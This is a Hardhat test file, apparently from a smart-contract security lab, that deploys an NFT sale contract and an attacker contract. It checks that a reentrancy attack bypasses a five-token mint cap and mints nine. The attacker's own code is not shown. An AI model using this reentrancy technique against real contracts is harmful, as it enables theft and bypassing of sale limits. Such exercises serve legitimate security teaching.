import { expect } from "chai";
import { network } from "hardhat";

const { ethers } = await network.create();

describe("Part 3-B: Bypassing NFT Mint Cap via Reentrancy", function () {
    let nftSale, attacker;
    let deployer;

    beforeEach(async function () {
        [deployer] = await ethers.getSigners();

        // 1. Deploy NftSale
        const NftSale = await ethers.getContractFactory("NftSale");
        nftSale = await NftSale.deploy();
        await nftSale.waitForDeployment();
        const nftSaleAddr = await nftSale.getAddress();

        // 2. Deploy Attacker
        const NftSaleAttacker = await ethers.getContractFactory("NftSaleAttacker");
        attacker = await NftSaleAttacker.deploy(nftSaleAddr);
        await attacker.waitForDeployment();
    });

    it("Should bypass the 5 NFT cap and mint 9 NFTs", async function () {
        const price = ethers.parseUnits("100", "gwei");

        // Calculate required ETH for the attack:
        // 4 recursive buys of 2 NFTs = 8 * price
        // 1 recursive buy of 1 NFT = 1 * price
        // Total = 9 * price
        const attackFund = price * 9n;

        // Fund the attacker contract
        await deployer.sendTransaction({
            to: await attacker.getAddress(),
            value: attackFund
        });

        // Execute the attack
        await attacker.attack();

        // Verify that totalSupply exceeded the cap of 5 and reached 9
        const finalSupply = await nftSale.totalSupply();
        console.log("Final Total Supply:", finalSupply.toString());
        expect(finalSupply).to.equal(9n);

        // Verify that the attacker owns all 9 NFTs (IDs 0 to 8)
        const attackerAddr = await attacker.getAddress();
        for (let i = 0; i < 9; i++) {
            expect(await nftSale.ownerOf(i)).to.equal(attackerAddr);
        }

        console.log("Successfully bypassed the cap and minted 9 NFTs!");
    });
});